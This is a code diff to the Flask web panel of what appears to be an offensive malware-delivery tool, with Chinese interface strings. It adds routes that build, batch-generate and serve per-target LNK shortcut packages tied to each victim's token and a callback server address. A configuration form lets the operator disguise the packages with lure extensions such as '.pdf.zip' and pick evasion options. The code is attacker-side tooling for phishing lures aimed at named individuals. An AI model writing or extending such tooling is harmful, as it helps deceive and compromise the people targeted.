@@ -28,6 +28,21 @@ def _remove_screenshot(filename):
         except OSError:
             pass
 
+
+def _remove_lnk_artifact(token):
+    """Delete the generated LNK ZIP for a token and clear its registry entry."""
+    from .exe_builder import OUTPUT_DIR
+    from .lnk_builder import get_lnk_filename, unregister_lnk
+    filename = get_lnk_filename(token)
+    if filename:
+        path = os.path.join(OUTPUT_DIR, filename)
+        if os.path.exists(path):
+            try:
+                os.remove(path)
+            except OSError:
+                pass
+    unregister_lnk(token)
+
 # ---- Management Web UI Blueprint ----
 routes_web = Blueprint('routes_web', __name__)
 
@@ -141,6 +156,11 @@ def _exe_exists(target_name, token):
     return is_exe_registered(token)
 
 
+def _lnk_exists(token):
+    from .lnk_builder import is_lnk_registered
+    return is_lnk_registered(token)
+
+
 @routes_web.route('/targets')
 @login_required
 def targets():
@@ -149,6 +169,7 @@ def targets():
     all_targets = get_targets_page(pagination['page'], pagination['page_size'])
     for t in all_targets:
         t['exe_exists'] = _exe_exists(t['name'], t['unique_token'])
+        t['lnk_exists'] = _lnk_exists(t['unique_token'])
     server_configured = _check_server_configured()
     return render_template(
         'targets.html',
@@ -366,6 +387,7 @@ def delete_target(target_id):
         _remove_screenshot(s)
     if target and target.get('unique_token'):
         unregister_exe(target['unique_token'])
+        _remove_lnk_artifact(target['unique_token'])
     flash('目标已删除', 'success')
     return redirect(url_for('routes_web.targets'))
 
@@ -415,6 +437,33 @@ def build_status_all():
     return jsonify(get_all_build_status())
 
 
+@routes_web.route('/targets/<int:target_id>/build_lnk', methods=['POST'])
+@login_required
+def build_lnk_from_target(target_id):
+    if not _require_server_configured():
+        return jsonify({'status': 'error', 'message': '请先在 EXE 配置页面设置服务器 IP'}), 400
+
+    from .lnk_builder import build_lnk_zip
+
+    target = get_target_by_id(target_id)
+    if not target:
+        return jsonify({'status': 'error', 'message': '目标不存在'}), 404
+
+    try:
+        zip_path = build_lnk_zip(
+            _get_listen_url(), target['unique_token'], target['name'],
+            target.get('exe_filename', '')
+        )
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+    return jsonify({
+        'status': 'ok',
+        'message': 'LNK 包生成完毕',
+        'filename': os.path.basename(zip_path),
+    })
+
+
 @routes_web.route('/targets/<int:target_id>/download_exe')
 @login_required
 def download_exe_from_target(target_id):
@@ -431,6 +480,41 @@ def download_exe_from_target(target_id):
         return redirect(url_for('routes_web.targets'))
 
     return send_file(filepath, as_attachment=True, download_name=filename)
+
+
+@routes_web.route('/targets/<int:target_id>/download_lnk')
+@login_required
+def download_lnk_from_target(target_id):
+    target = get_target_by_id(target_id)
+    if not target:
+        flash('目标不存在', 'error')
+        return redirect(url_for('routes_web.targets'))
+
+    from .exe_builder import OUTPUT_DIR
+    from .lnk_builder import get_lnk_filename, lnk_zip_name
+    filename = get_lnk_filename(target['unique_token'])
+    if not filename:
+        filename = lnk_zip_name(target['name'], target['unique_token'],
+                                target.get('exe_filename', ''))
+    filepath = os.path.join(OUTPUT_DIR, filename)
+    if not os.path.exists(filepath):
+        flash('LNK 包不存在，请先生成', 'error')
+        return redirect(url_for('routes_web.targets'))
+
+    return send_file(filepath, as_attachment=True, download_name=filename)
+
+
+@routes_web.route('/targets/<int:target_id>/delete_lnk', methods=['POST'])
+@login_required
+def delete_lnk_from_target(target_id):
+    target = get_target_by_id(target_id)
+    if not target:
+        flash('目标不存在', 'error')
+        return redirect(url_for('routes_web.targets'))
+
+    _remove_lnk_artifact(target['unique_token'])
+    flash('LNK 包已删除', 'success')
+    return redirect(url_for('routes_web.targets'))
 
 
 @routes_web.route('/targets/<int:target_id>/delete_exe', methods=['POST'])
@@ -456,13 +540,15 @@ def delete_exe_from_target(target_id):
 @login_required
 def delete_all_exe():
     from .exe_builder import OUTPUT_DIR, clear_exe_registry, BIN_EXT
+    from .lnk_builder import clear_lnk_registry
     count = 0
     if os.path.exists(OUTPUT_DIR):
         for f in os.listdir(OUTPUT_DIR):
-            if f.endswith(BIN_EXT):
+            if f.endswith(BIN_EXT) or f.endswith('.zip'):
                 os.remove(os.path.join(OUTPUT_DIR, f))
                 count += 1
     clear_exe_registry()
+    clear_lnk_registry()
     flash(f'已清除 {count} 个文件', 'success')
     return redirect(url_for('routes_web.targets'))
 
@@ -489,6 +575,7 @@ def batch_delete_targets():
             _remove_screenshot(s)
         for t in tokens:
             unregister_exe(t['unique_token'])
+            _remove_lnk_artifact(t['unique_token'])
         flash(f'已删除 {len(ids)} 个目标', 'success')
     return redirect(url_for('routes_web.targets'))
 
@@ -512,6 +599,36 @@ def batch_build_exe_targets():
             )
             count += 1
     return jsonify({'status': 'ok', 'message': f'已开始生成 {count} 个EXE'})
+
+
+@routes_web.route('/targets/batch_build_lnk', methods=['POST'])
+@login_required
+def batch_build_lnk_targets():
+    if not _require_server_configured():
+        return jsonify({'status': 'error', 'message': '请先在 EXE 配置页面设置服务器 IP'}), 400
+
+    from .lnk_builder import build_lnk_zip
+    ids = request.form.getlist('ids[]')
+    listen_url = _get_listen_url()
+    success = 0
+    errors = []
+    for tid in ids:
+        target = get_target_by_id(int(tid))
+        if not target:
+            continue
+        try:
+            build_lnk_zip(
+                listen_url, target['unique_token'], target['name'],
+                target.get('exe_filename', '')
+            )
+            success += 1
+        except Exception as e:
+            errors.append(f"{target['name']}: {e}")
+
+    message = f'已生成 {success} 个 LNK 包'
+    if errors:
+        message += f'，失败 {len(errors)} 个'
+    return jsonify({'status': 'ok', 'message': message})
 
 
 # ---- EXE Generation ----
@@ -541,15 +658,16 @@ def build_base():
 @routes_web.route('/exe/generate')
 @login_required
 def exe_generate():
-    from .exe_builder import OUTPUT_DIR, BIN_EXT, BASE_EXE_PATH
+    from .exe_builder import OUTPUT_DIR, BASE_EXE_PATH
     all_targets = get_all_targets()
     files = []
     if os.path.exists(OUTPUT_DIR):
-        files = sorted(
-            [f for f in os.listdir(OUTPUT_DIR) if f.endswith(BIN_EXT)],
-            key=lambda f: os.path.getmtime(os.path.join(OUTPUT_DIR, f)),
-            reverse=True
-        )
+        names = [f for f in os.listdir(OUTPUT_DIR)
+                 if f.endswith('.exe') or f.endswith('.zip')]
+        names.sort(key=lambda f: os.path.getmtime(os.path.join(OUTPUT_DIR, f)),
+                   reverse=True)
+        for f in names:
+            files.append({'name': f, 'kind': 'lnk' if f.endswith('.zip') else 'exe'})
     has_base_exe = os.path.exists(BASE_EXE_PATH)
     server_configured = _check_server_configured()
     return render_template('exe_generate.html', targets=all_targets, files=files,
@@ -580,6 +698,62 @@ def build_single_exe(target_id):
     except Exception as e:
         flash(f'EXE生成失败: {e}', 'error')
 
+    return redirect(url_for('routes_web.exe_generate'))
+
+
+@routes_web.route('/exe/generate/<int:target_id>/lnk', methods=['POST'])
+@login_required
+def build_single_lnk(target_id):
+    if not _require_server_configured():
+        return redirect(url_for('routes_web.exe_config'))
+
+    from .lnk_builder import build_lnk_zip
+
+    target = get_target_by_id(target_id)
+    if not target:
+        flash('目标不存在', 'error')
+        return redirect(url_for('routes_web.exe_generate'))
+
+    try:
+        zip_path = build_lnk_zip(
+            _get_listen_url(), target['unique_token'], target['name'],
+            target.get('exe_filename', '')
+        )
+        flash(f'LNK 包生成成功: {os.path.basename(zip_path)}', 'success')
+    except Exception as e:
+        flash(f'LNK 包生成失败: {e}', 'error')
+
+    return redirect(url_for('routes_web.exe_generate'))
+
+
+@routes_web.route('/exe/generate/batch_lnk', methods=['POST'])
+@login_required
+def build_batch_lnk_packages():
+    if not _require_server_configured():
+        return redirect(url_for('routes_web.exe_config'))
+
+    from .lnk_builder import build_lnk_zips_batch
+
+    target_ids = request.form.getlist('target_ids')
+    if not target_ids:
+        flash('请选择至少一个目标', 'error')
+        return redirect(url_for('routes_web.exe_generate'))
+
+    targets = []
+    for tid in target_ids:
+        t = get_target_by_id(int(tid))
+        if t:
+            targets.append({
+                'id': t['id'],
+                'name': t['name'],
+                'token': t['unique_token'],
+                'exe_filename': t.get('exe_filename', ''),
+            })
+
+    results = build_lnk_zips_batch(_get_listen_url(), targets)
+    success_count = sum(1 for r in results if r['success'])
+    fail_count = len(results) - success_count
+    flash(f'LNK 包批量生成完成: 成功 {success_count} 个, 失败 {fail_count} 个', 'success')
     return redirect(url_for('routes_web.exe_generate'))
 
 
@@ -789,6 +963,21 @@ def exe_config():
             save_config(config)
             flash('服务端配置已保存', 'success')
 
+        # Handle LNK package settings (separate form)
+        if request.form.get('save_lnk'):
+            from .lnk_builder import LURE_EXT_CHOICES, EVASION_CHOICES
+            ext = request.form.get('lnk_lure_ext', 'pdf').strip().lower()
+            selected = set(request.form.getlist('lnk_evasion'))
+            evasion = [key for key in EVASION_CHOICES if key in selected]
+            if ext in LURE_EXT_CHOICES:
+                config = load_config()
+                config['lnk_lure_ext'] = ext
+                config['lnk_evasion'] = evasion
+                save_config(config)
+                flash('LNK 压缩包设置已保存', 'success')
+            else:
+                flash('不支持的 LNK 伪装后缀', 'error')
+
         return redirect(url_for('routes_web.exe_config'))
 
     # Generate built-in icons if not exist
@@ -811,7 +1000,14 @@ def exe_config():
 
     config = load_config()
     preview = config['name_template'].replace('{name}', '张三').replace('{token8}', 'a1b2c3d4').replace('{token}', 'a1b2c3d4-xxxx-xxxx-xxxx-xxxxxxxxxxxx')
-    return render_template('exe_config.html', config=config, preview=preview, presets=presets)
+    from .lnk_builder import LURE_EXT_CHOICES, EVASION_OPTIONS
+    lure_ext = config.get('lnk_lure_ext', 'pdf')
+    lnk_preview = f'{preview}.{lure_ext}.zip'
+    return render_template('exe_config.html', config=config, preview=preview,
+                           lnk_preview=lnk_preview, presets=presets,
+                           lure_ext_choices=LURE_EXT_CHOICES,
+                           evasion_options=EVASION_OPTIONS,
+                           lnk_evasion=config.get('lnk_evasion', []))
 
 
 # ---- Data Export / Import ----
